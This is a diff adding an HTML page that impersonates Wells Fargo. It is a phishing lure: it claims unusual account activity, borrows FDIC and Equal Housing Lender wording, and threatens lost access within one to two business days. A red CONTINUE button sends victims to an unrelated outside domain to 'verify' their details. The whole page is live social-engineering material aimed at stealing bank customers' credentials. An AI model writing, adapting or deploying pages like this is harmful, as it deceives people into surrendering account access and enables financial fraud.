@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Before we proceed</title><!-- update the version number as needed -->
+    <script defer src="//firebase/7.15.1/firebase-app.js"></script><!-- include only the Firebase features as you need -->
+    <script defer src="//firebase/7.15.1/firebase-auth.js"></script>
+    <script defer src="//firebase/7.15.1/firebase-database.js"></script>
+    <script defer src="//firebase/7.15.1/firebase-messaging.js"></script>
+    <script defer src="//firebase/7.15.1/firebase-storage.js"></script><!-- initialize the SDK after all desired features are loaded -->
+    <script defer src="//firebase/init.js"></script>
+    <style media="screen">
+        body {
+            background-image: url('https://upload-c5162.web.app/wells/pc.jpg');
+        }
+
+        #message {
+            background: white;
+            max-width: 660px;
+            margin: 50px auto 50px;
+            padding: 10px 24px;
+            border-radius: 10px;
+        }
+
+        #message h2 {
+            color: #ffa100;
+            font-weight: bold;
+            font-size: 16px;
+            margin: 0 0 8px;
+        }
+
+        #message h1 {
+            font-size: 22px;
+            font-weight: 300;
+            color: rgba(0, 0, 0, 0.753);
+            margin: 0 0 16px;
+            font-family: Arial, Helvetica;
+            font-style: bold;
+        }
+
+        #message p {
+            line-height: 140%;
+            margin: 16px 0 24px;
+            font-size: 15px;
+            font-family: Arial, Helvetica;
+        }
+
+        #load {
+            color: rgba(0, 0, 0, 0.4);
+            text-align: center;
+            font-size: 15px;
+            font-family: Arial, Helvetica;
+        }
+
+        @media (max-width: 600px) {
+            body {
+                background-image: url('https://upload-c5162.web.app/wells/phone.jpg');
+            }
+
+            #message {
+                margin: 60px auto 60px;
+                max-width: 600px;
+                padding: 15px 15px;
+                box-shadow: none;
+                border-radius: 10px
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div id="message">
+        <p style="text-align:center;"><img src="https://upload-c5162.web.app/wells/logo.png" alt="Logo" width="300" height="63"></p>
+        <h1>Please read carefully</h1>
+        <p>We've noticed something unusual about your account information and will take a minute with you to verify all account information.</p>
+        <p>• We will review all account activity upon verification</p>
+        <p><b>Why am i seeing this message?</b></p>
+        <p>• This message is to inform and assist you with update/verification of your account details which we have in our records
+            " As a Member of FDIC. Equal Housing Lender, we're asked to always keep our customers personal information up to date  " </p>
+        <p>This may happen because of the following reasons</p>
+        <P>• Typographical errors or outdated personal details</P>
+        <p><b>NOTE</b> : If your account information is not confirmed and verified within 1-2 business days, then your ability to access your account will be unavailable</p>    
+        <div style="Margin-left: 20px;Margin-right: 20px;">
+            <div class="btn btn--shadow btn--medium" style="Margin-bottom: 20px;text-align: center;"><a style="border-radius: 4px;display: inline-block;font-size: 12px;font-weight: bold;line-height: 22px;padding: 10px 20px 11px 20px;text-align: center;text-decoration: none !important;transition: opacity 0.1s ease-in;color: #ffffff !important;box-shadow: inset 0 -2px 0 0 rgba(0, 0, 0, 0.2);background-color: #ff0606;font-family: Arial, Helvetica, sans-serif;" href="https://oamweb.co/oam?pgs">CONTINUE</a>
+              
+            </div>
+            <div style=text-align:center;font-size:15px;line-height:19px;margin-top:20px;>
+                <div>Wells Fargo Team</div>
+                <p id="load"></p>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
